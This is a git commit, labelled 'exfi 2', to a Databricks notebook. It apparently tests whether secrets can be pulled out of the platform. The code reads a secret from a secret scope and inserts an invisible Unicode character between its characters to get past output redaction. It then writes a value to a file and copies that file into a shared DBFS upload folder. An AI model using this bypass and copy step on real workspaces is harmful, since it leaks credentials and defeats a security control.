faddbd868e90f6019029f5293259c40404460f82
Rapael-Cossec <Rapael-Cossec>
2024-07-02 09:41:54 +0000

    exfi 2

--- test/Notebook sans titre 2024-06-26 16:12:11.py
+++ test/Notebook sans titre 2024-06-26 16:12:11.py
@@ -2,17 +2,37 @@
 invisible_sep = bytes.fromhex("E281A3").decode("utf-8")
 secret = dbutils.secrets.get("dbsystem-Scope", "db_server")
 plaintextSecret = secret.replace("", invisible_sep)
-print(plaintextSecret) 
+
 plaintextSecret = "secret"
 
-f = open("mysecret.txt", "w")
+f = open("mysecret2.txt", "w")
 f.write(plaintextSecret)
 f.close()
-f = open("mysecret.txt", "r")
+f = open("mysecret2.txt", "r")
 print(f.read())
 f.close()
 
 # COMMAND ----------
 
-⁣
-secret
+# MAGIC %sh cp mysecret2.txt /dbfs/FileStore/tables/shared_uploads/retriever.ssiosdr@axa.fr
+# MAGIC
+
+# COMMAND ----------
+
+# File location and type
+file_location = "/FileStore/shared_uploads/retriever.ssiosdr@axa.fr/mysecret2.txt"
+file_type = "csv"
+
+# CSV options
+infer_schema = "false"
+first_row_is_header = "false"
+delimiter = ","
+
+# The applied options are for CSV files. For other file types, these will be ignored.
+df = spark.read.format(file_type) \
+  .option("inferSchema", infer_schema) \
+  .option("header", first_row_is_header) \
+  .option("sep", delimiter) \
+  .load(file_location)
+
+display(df)
